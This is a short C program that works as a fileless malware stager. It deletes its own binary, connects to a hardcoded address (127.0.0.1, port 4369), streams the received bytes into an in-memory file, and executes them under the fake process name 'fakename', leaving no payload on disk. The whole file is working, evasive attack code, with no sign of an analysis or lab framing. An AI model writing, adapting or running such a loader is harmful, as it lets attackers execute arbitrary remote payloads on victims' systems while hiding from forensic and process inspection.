#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

#include <sys/syscall.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>


int main(int argc, char **argv, char **env) {
    int l, s;
    unsigned long addr = 0x0100007f11110002;
    char *args[2] = {"fakename", NULL};
    char buf[1024];

    unlink(argv[0]);

    // Connect
    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit(1);
    if (connect(s, (struct sockaddr *) &addr, 16) < 0) exit(1);
    int fd = memfd_create("k", 0);

    while (1) {
        if ((l = read(s, buf, 1024)) <= 0) break;
        write(fd, buf, l);
    }
    close(s);

    execveat(fd, "", args, env, AT_EMPTY_PATH);
    return 0;
}
